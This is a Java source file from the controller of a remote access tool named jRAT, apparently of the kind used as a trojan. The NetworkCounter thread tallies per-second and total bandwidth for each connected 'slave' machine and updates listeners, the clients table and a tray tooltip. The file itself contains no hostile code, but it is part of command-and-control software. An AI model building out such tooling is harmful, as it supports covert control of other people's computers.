package jrat.controller.threads;

import jrat.common.utils.DataUnits;
import jrat.controller.AbstractSlave;
import jrat.controller.Main;
import jrat.controller.listeners.GlobalNetworkMonitorListener;
import jrat.controller.listeners.NetworkMonitorListener;
import jrat.controller.ui.Columns;
import jrat.controller.ui.panels.PanelMainClientsTable;
import jrat.controller.utils.TrayIconUtils;

import java.util.ArrayList;
import java.util.List;

public class NetworkCounter implements Runnable {
	
	private static final List<NetworkMonitorListener> INDIVIDUAL_LISTENERS = new ArrayList<>();
	private static final List<GlobalNetworkMonitorListener> GLOBAL_LISTENERS = new ArrayList<>();
	
	/**
	 * Total bandwidth this session
	 */
	public static long totalIn;
	public static long totalOut;
	
	/**
	 * Current bandwidth each second
	 */
	public static int currentIn;
	public static int currentOut;
	
	@Override
	public void run() {
		try {
			while (true) {
				Thread.sleep(1000L);

				int in = 0;
				int out = 0;
				
				for (AbstractSlave slave : Main.connections) {
					int sin = (int) slave.getCountingInputStream().getCount();
					int sout = (int) slave.getCountingOutputStream().getCount();
					in += sin;
					out += sout;
					
					for (NetworkMonitorListener listener : INDIVIDUAL_LISTENERS) {
						listener.onUpdate(slave, sin, sout);
					}
					
					slave.increaseTotalIn(sin);
					slave.increaseTotalOut(sout);
					slave.setCurrentIn(sin);
					slave.setCurrentOut(sout);
				}
				
				for (GlobalNetworkMonitorListener listener : GLOBAL_LISTENERS) {
					listener.onUpdate(in, out);
				}
							
				for (AbstractSlave slave : Main.connections) {
					slave.getCountingInputStream().reset();
					slave.getCountingOutputStream().reset();
				}
				
				currentIn = in;
				currentOut = out;
				totalIn += in;
				totalOut += out;
				
				if (!Main.headless && Main.instance.getPanelClients() instanceof PanelMainClientsTable) {
					PanelMainClientsTable panel = (PanelMainClientsTable) Main.instance.getPanelClients();
					
					if (panel.getColumns().contains(Columns.NETWORK_USAGE.getName())) {
						Main.instance.repaint();
					}
				}

				TrayIconUtils.setToolTip(DataUnits.getAsString(in) + "/s down, " + DataUnits.getAsString(out) + "/s up");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void addGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.add(listener);
	}
	
	public static void removeGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.remove(listener);
	}

	public static void addListener(NetworkMonitorListener listener) {
		INDIVIDUAL_LISTENERS.add(listener);
	}
	
	public static void removeListener(NetworkMonitorListener listener) {
		INDIVIDUAL_LISTENERS.remove(listener);
	}
}

